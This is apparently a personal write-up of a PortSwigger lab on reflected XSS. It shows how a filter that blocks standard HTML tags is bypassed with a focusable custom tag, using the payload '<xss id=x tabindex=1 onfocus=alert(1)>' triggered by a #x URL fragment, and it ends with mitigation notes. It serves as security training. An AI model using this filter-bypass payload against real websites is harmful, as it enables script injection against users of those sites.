# Lab12 - Reflected XSS Into HTML Context With All Tags Blocked Except Custom Tags

## Objective

Exploit reflected XSS despite aggressive tag filtering.

Execute:

```javascript
alert(1)
```

using a custom tag.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

The filter blocks standard HTML tags.

However:

```text
Custom Tags
```

remain allowed.

---

# Analysis

## Step 1

Test common tags.

Examples:

```html
<script>
<img>
<svg>
```

Blocked.

---

## Step 2

Test custom tag.

Example:

```html
<xss>
```

Accepted.

---

## Step 3

Need executable event.

Discovered:

```html
onfocus
```

allowed.

---

# Full Payload(s) Used

```html
<xss id=x tabindex=1 onfocus=alert(1)>
```

---

Exploit URL:

```html
#x
```

used to focus element automatically.

---

# Why The Payload Works

```text
Custom Tag Allowed
        ↓
tabindex Makes Focusable
        ↓
onfocus Executes
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Observation

All standard tags blocked.

---

## Key Realization

HTML allows:

```text
Custom Elements
```

---

## Exploitation Strategy

Create focusable custom element.

Use:

```html
tabindex
```

to receive focus.

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Disallow custom tags.

Apply strict HTML sanitization.

---

# Key Learnings

- Custom elements are often forgotten by filters.
- tabindex can create new attack surfaces.
- Always test beyond standard HTML tags.